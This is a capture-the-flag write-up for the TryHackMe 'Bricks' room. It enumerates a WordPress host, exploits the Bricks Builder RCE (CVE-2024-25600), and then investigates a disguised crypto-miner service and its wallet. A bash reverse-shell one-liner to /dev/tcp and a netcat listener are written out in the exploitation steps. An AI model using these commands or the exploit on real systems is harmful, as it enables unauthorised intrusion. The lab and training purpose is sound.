# Description

Crack the code, command the exploit! Dive into the heart of the system with just an RCE CVE as your key.  

__From Three Million Bricks to Three Million Transactions!__  

Brick Press Media Co. was working on creating a brand-new web theme that represents a renowned wall using three million byte bricks. Agent Murphy comes with a streak of bad luck. And here we go again: the server is compromised, and they've lost access.  

Can you hack back the server and identify what happened there?  

__Note:__ Add `MACHINE_IP` bricks.thm to your __/etc/hosts__ file.  

## Questions

> What is the content of the hidden .txt file in the web folder?  

> What is the name of the suspicious process?  

> What is the service name affiliated with the suspicious process?  

> What is the log file name of the miner instance?  

> What is the wallet address of the miner instance?  

> The wallet address used has been involved in transactions between wallets belonging to which threat group?  

# Steps

## 1. enumerate ports with `nmap`

```bash
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 0e:9a:b9:cf:85:5a:6e:97:c8:df:e0:24:c8:c1:02:2e (RSA)
|   256 ca:74:46:b4:3d:86:c3:b4:9c:ae:26:21:12:a7:60:a2 (ECDSA)
|_  256 16:20:8a:a9:df:26:6c:8f:33:4d:bd:b2:7d:2d:04:47 (ED25519)
80/tcp   open  http     Python http.server 3.5 - 3.10
|_http-title: Error response
|_http-server-header: WebSockify Python/3.8.10
443/tcp  open  ssl/http Apache httpd
| tls-alpn:
|   h2
|_  http/1.1
|_http-server-header: Apache
|_ssl-date: TLS randomness does not represent time
|_http-generator: WordPress 6.5
|_http-title: Brick by Brick
| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=US
| Not valid before: 2024-04-02T11:59:14
|_Not valid after:  2025-04-02T11:59:14
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
3306/tcp open  mysql    MySQL (unauthorized)
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Visiting `https://bricks.thm:443` is just a picture of bricks. The questions that the room is asking makes it sound like the site was hijacked by a crypto miner.  

I tried looking through __exploit-db__ for WordPress 6.5, but was not finding what I was looking for so I instead searched for __WordPress 6.5 CVE__ in my browser and found this site for [`wpscan`](https://wpscan.com/wordpress/65/). Kali Linux has `wpscan` installed so we can use it.  

## 2. wpscan

```bash
└─$ wpscan -v --url https://bricks.thm/ --disable-tls-checks
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: https://bricks.thm/ [10.201.20.31]
[+] Started: Tue Aug  5 18:36:26 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: server: Apache
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: https://bricks.thm/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: https://bricks.thm/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: https://bricks.thm/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: https://bricks.thm/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.5 identified (Insecure, released on 2024-04-02).
 | Found By: Rss Generator (Passive Detection)
 |  - https://bricks.thm/feed/, <generator>https://wordpress.org/?v=6.5</generator>
 |  - https://bricks.thm/comments/feed/, <generator>https://wordpress.org/?v=6.5</generator>

[+] WordPress theme in use: bricks
 | Location: https://bricks.thm/wp-content/themes/bricks/
 | Readme: https://bricks.thm/wp-content/themes/bricks/readme.txt
 | Style URL: https://bricks.thm/wp-content/themes/bricks/style.css
 | Style Name: Bricks
 | Style URI: https://bricksbuilder.io/
 | Description: Visual website builder for WordPress.
 | Author: Bricks
 | Author URI: https://bricksbuilder.io/
 | License: GPLv2
 | License URI: https://www.gnu.org/licenses/gpl-2.0.html
 | Text Domain: bricks
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | Version: 1.9.5 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - https://bricks.thm/wp-content/themes/bricks/style.css, Match: 'Version: 1.9.5'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:09 <===============================================> (137 / 137) 100.00% Time: 00:00:09

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Tue Aug  5 18:36:47 2025
[+] Requests Done: 170
[+] Cached Requests: 7
[+] Data Sent: 41.615 KB
[+] Data Received: 110.502 KB
[+] Memory used: 265.75 MB
[+] Elapsed time: 00:00:21
```

The important part is here:

```bash
[+] WordPress theme in use: bricks
 | Location: https://bricks.thm/wp-content/themes/bricks/
 | Readme: https://bricks.thm/wp-content/themes/bricks/readme.txt
 | Style URL: https://bricks.thm/wp-content/themes/bricks/style.css
 | Style Name: Bricks
 | Style URI: https://bricksbuilder.io/
 | Description: Visual website builder for WordPress.
 | Author: Bricks
 | Author URI: https://bricksbuilder.io/
 | License: GPLv2
 | License URI: https://www.gnu.org/licenses/gpl-2.0.html
 | Text Domain: bricks
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | Version: 1.9.5 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - https://bricks.thm/wp-content/themes/bricks/style.css, Match: 'Version: 1.9.5'
```

The WordPress site is made using bricks builder (bricks is the name of the room so this is likely the vulnerability). It uses version 1.9.5 of bricks builder and I was able to find [remote code execution](https://github.com/K3ysTr0K3R/CVE-2024-25600-EXPLOIT) in versions <= 1.9.6 of the bricks builder plugin. I downloaded the python script and ran it.

## 3. Exploit bricks builder plugin <= 1.9.6 RCE

```bash
└─$ python CVE-2024-25600.py -u https://bricks.thm/   

   _______    ________    ___   ____ ___  __ __       ___   ___________ ____  ____
  / ____/ |  / / ____/   |__ \ / __ \__ \/ // /      |__ \ / ____/ ___// __ \/ __ \
 / /    | | / / __/________/ // / / /_/ / // /_________/ //___ \/ __ \/ / / / / / /
/ /___  | |/ / /__/_____/ __// /_/ / __/__  __/_____/ __/____/ / /_/ / /_/ / /_/ /
\____/  |___/_____/    /____/\____/____/ /_/       /____/_____/\____/\____/\____/
    
Coded By: K3ysTr0K3R --> Hello, Friend!

[*] Checking if the target is vulnerable
[+] The target is vulnerable
[*] Initiating exploit against: https://bricks.thm/
[*] Initiating interactive shell
[+] Interactive shell opened successfully
Shell> id
uid=1001(apache) gid=1001(apache) groups=1001(apache)
```
> Make sure that you have added `MACHINE_IP` bricks.thm to your __/etc/hosts__ file.  

## 4. Setup a Reverse Shell

```bash
nc -lnvp 9001
```
> listener

```bash
bash -c 'bash -i >& /dev/tcp/VPN_IP/9001 0>&1'
```
> target

```bash
$ export TERM=xterm
$ id
uid=1001(apache) gid=1001(apache) groups=1001(apache)
```

## 5. Uncover the Hidden .txt file

```bash
apache@tryhackme:/data/www/default$ cat 650c844110baced87e1606453b93f22a.txt
THM{fl46_650c844110baced87e1606453b93f22a}
```

## 5. Find the service name affiliated with the suspicious process

I tried to list all processes with `ps -elf`, but it was a lot to sort through so I skipped to listing services with `systemctl | grep running` and found the answer to question 3 which is `ubuntu.service`.

```bash
$ systemctl | grep running
...
  ubuntu.service                                   loaded active     running         TRYHACK3M 
...
```

## 6. Find the name of the suspicious process

We can run `systemctl cat ubuntu.service` to find the answer to question 2 which is __nm-inet-dialog__.

```bash
$ systemctl cat ubuntu.service
# /etc/systemd/system/ubuntu.service
[Unit]
Description=TRYHACK3M

[Service]
Type=simple
ExecStart=/lib/NetworkManager/nm-inet-dialog
Restart=on-failure

[Install]
WantedBy=multi-user.target
```

## 7. Find the log file name of the miner instance

```bash
$ cd /usr/lib/NetworkManager 
$ ls -l
total 8620
drwxr-xr-x 2 root root    4096 Feb 27  2022 VPN
drwxr-xr-x 2 root root    4096 Apr  3  2024 conf.d
drwxr-xr-x 5 root root    4096 Feb 27  2022 dispatcher.d
-rw-r--r-- 1 root root   48190 Apr 11  2024 inet.conf
-rwxr-xr-x 1 root root   14712 Feb 16  2024 nm-dhcp-helper
-rwxr-xr-x 1 root root   47672 Feb 16  2024 nm-dispatcher
-rwxr-xr-x 1 root root  843048 Feb 16  2024 nm-iface-helper
-rwxr-xr-x 1 root root 6948448 Apr  8  2024 nm-inet-dialog
-rwxr-xr-x 1 root root  658736 Feb 16  2024 nm-initrd-generator
-rwxr-xr-x 1 root root   27024 Mar 11  2020 nm-openvpn-auth-dialog
-rwxr-xr-x 1 root root   59784 Mar 11  2020 nm-openvpn-service
-rwxr-xr-x 1 root root   31032 Mar 11  2020 nm-openvpn-service-openvpn-helper
-rwxr-xr-x 1 root root   51416 Nov 27  2018 nm-pptp-auth-dialog
-rwxr-xr-x 1 root root   59544 Nov 27  2018 nm-pptp-service
drwxr-xr-x 2 root root    4096 Nov 27  2021 system-connections
```
> inet.conf is the name of the log file for question 4

## 8. Find the wallet address of the miner instance

```bash
$ grep -a -i -v miner inet.conf
ID: 5757314e65474e5962484a4f656d787457544e424e574648555446684d3070735930684b616c70555a7a566b52335276546b686b65575248647a525a57466f77546b64334d6b347a526d685a6255313459316873636b35366247315a4d304531595564476130355864486c6157454a3557544a564e453959556e4a685246497a5932355363303948526a4a6b52464a7a546d706b65466c525054303d
2024-04-08 10:46:04,743 [*] confbak: Ready!
2024-04-08 10:46:04,743 [*] Status: Mining!
2024-04-08 10:46:08,745 [*] Status: Mining!
ID: 5757314e65474e5962484a4f656d787457544e424e574648555446684d3070735930684b616c70555a7a566b52335276546b686b65575248647a525a57466f77546b64334d6b347a526d685a6255313459316873636b35366247315a4d304531595564476130355864486c6157454a3557544a564e453959556e4a685246497a5932355363303948526a4a6b52464a7a546d706b65466c525054303d
2024-04-08 10:48:04,647 [*] confbak: Ready!
2024-04-08 10:48:04,648 [*] Status: Mining!
2024-04-08 10:48:08,649 [*] Status: Mining!
ID: 5757314e65474e5962484a4f656d787457544e424e574648555446684d3070735930684b616c70555a7a566b52335276546b686b65575248647a525a57466f77546b64334d6b347a526d685a6255313459316873636b35366247315a4d304531595564476130355864486c6157454a3557544a564e453959556e4a685246497a5932355363303948526a4a6b52464a7a546d706b65466c525054303d
2024-04-11 10:17:47,822 [*] confbak: Ready!
2024-04-11 10:17:47,822 [*] Status: Mining!
2024-04-11 10:17:51,825 [*] Status: Mining!
```

The wallet address is this encrypted value (actually it's two wallet addresses).
> 5757314e65474e5962484a4f656d787457544e424e574648555446684d3070735930684b616c70555a7a566b52335276546b686b65575248647a525a57466f77546b64334d6b347a526d685a6255313459316873636b35366247315a4d304531595564476130355864486c6157454a3557544a564e453959556e4a685246497a5932355363303948526a4a6b52464a7a546d706b65466c525054303d  

We would use [cyberchef](https://cybershef.org) to decode this string which happens to be hex encoded base64 encoded base64.  

```bash
└─$ echo 5757314e65474e5962484a4f656d787457544e424e574648555446684d3070735930684b616c70555a7a566b52335276546b686b65575248647a525a57466f77546b64334d6b347a526d685a6255313459316873636b35366247315a4d304531595564476130355864486c6157454a3557544a564e453959556e4a685246497a5932355363303948526a4a6b52464a7a546d706b65466c525054303d > /tmp/wallet && xxd -r -p /tmp/wallet | base64 --decode | base64 --decode
bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qabc1qyk79fcp9had5kreprce89tkh4wrtl8avt4l67qa
```

I found more about bitcoin wallet addresses [here](https://support.imkey.im/hc/en-001/articles/40387080080665-Distinguishing-the-Four-Types-of-Bitcoin-Addresses). Native SegWit Address (P2WPKH) starts with __bc1q__. There are two wallet addresses in the string. The first one was the answer for question 5.

> Bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa

## 9. Find the Associated Threat Group

For the last question you have to search through all off the [transactions](https://www.blockchain.com/explorer/addresses/btc/bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa) until you find a wallet address that leads to the answer, i.e. read a bunch of sites to find [__LockBit__](https://ofac.treasury.gov/recent-actions/20240220).
